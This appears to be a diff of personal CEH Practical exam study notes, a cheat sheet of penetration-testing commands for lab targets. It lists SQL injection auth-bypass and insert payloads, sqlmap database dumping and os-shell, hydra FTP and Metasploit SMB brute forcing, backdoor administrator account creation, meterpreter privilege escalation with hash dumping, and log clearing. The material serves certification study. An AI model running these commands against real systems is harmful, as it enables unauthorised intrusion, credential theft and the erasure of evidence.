@@ -1,4 +1,5 @@
 My ceh practical notes
+
 Footprinting 
 https://centralops.net (for whois record found from this website) 
 DNS footprinting -cmd nslookup, set type=a, google.com, set type=cname, google.com
@@ -7,6 +8,7 @@ Net User
 find how many users are available in laptop. so use this cmd in windows- net user ,then get users list
 
 Scanning Networks (always do sudo su) --> To be root
+
 netdiscover -r 192.168.1.0/24 (for how many host alive)
 1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
 nmap -oN /home/parrot/save.txt 192.168.1.0/24 (for save nmap cmd in txt format)
@@ -21,6 +23,7 @@ If even this the above command is not working then use this command-  namp -f 10
 9- for only ping scan use this command- nmap -sn 192.168.1.0/24
 10- Some time host is showing down, but when we try this  cmd - nmap -Pn 192.168.10 then showing is up 
 
+
 Enumeration
 1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
 2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
@@ -30,6 +33,7 @@ Enumeration
 5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
 				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
+
 
 Stegnography--> Snow , Openstego
 1- Hide Data Using Whitespace Stegnography while run this cmd using same path where snow folder saved like this(c:\Dell\Downloads\snow) go to path using cmd then put this - snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
@@ -41,8 +45,11 @@ https://hashes.com/en/tools/hash_identifier and https://crackstation.net/
 6- bctextEncoder for using some words encoded with password in this tools we can decode words with password. 
 7-cryptool using for data encrypt/decrypt with rc4/des(ecb) with key length
 
+
 Sniffing
 1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request, check HTML Form URL Encoded then get login & Password) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
+
+
 Hacking Web Servers
 1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
 						    GET /HTTP/1.0
@@ -53,8 +60,9 @@ Hacking Web Servers
 				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
 Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
-
 hydra -l user -P passlist.txt ftp://10.10.10.10
+
+
 Hacking Web Application
 1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
 2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
@@ -75,6 +83,8 @@ Then type msfconsole to open metasploit. Type -  use auxiliary/scanner/http/word
 		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
+
+
 SQL Injections
 1- Auth Bypass-  hi'OR 1=1 --
 2- Insert new details for creating login id & password if sql injection found in login page in username tab enter - blah';insert into login values('john','apple123');--
@@ -82,12 +92,13 @@ SQL Injections
 Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
 4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
-5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+5- Select the table you want to dump (Get username and password)-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   
 6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
 for blind sql injection to showing all profile in one profile so use this one http://www.XYZ.com/viewprofile.aspx?id=1%20OR%20NOT%20%28221%3E221%29
+
 
 Android
 1- nmap ip -sV -p 5555    (Scan for adb port)
@@ -96,8 +107,8 @@ Android
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
 5- for elf file its stored in scan or may be other folder so follow above cmd. then analyze elf file entrophy value
 for download elf files, first exit from adb, then type -sudo -i, adb pull /sdcard/scan after that its downloaded after that
-install ent so run - apt-get install ent, after installation. run ent serf.elf then get entrophy value 
-And if need sha384 value then run sha384sum serf.elf then get it 
+install ent so run - apt install ent, after installation. run ent serf.elf then get entrophy value 
+And if need sha384 value then run sha384sum test.elf then get it 
 
 Wireshark
 tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given, source is attacker ip showing with high packets (DOS attack)
@@ -139,3 +150,7 @@ if you want privilege escalation follow above cmd then below steps- type backgro
 type getuid, getsystem -t 1, then again type getuid now get it ntauthority login, Type the command run post/windows/gather/smart_hashdump (callecting hashdump from windows11 users details) and also type clearev cmd for log clear from system 
 HTTP Website enumuration 
 nmap -sV --script=http-enum [target domain or IP address] (here, the target website is www.certifiedhacker.com) and press Enter
+
+
+SMB Password Cracking
+msfconsole -q, use auxiliary/scanner/smb/smb_login, set PAS_FILE /home/parrot/password.txt, set RHOSTS 192.168.1.20, set SMBUser administrator, run 
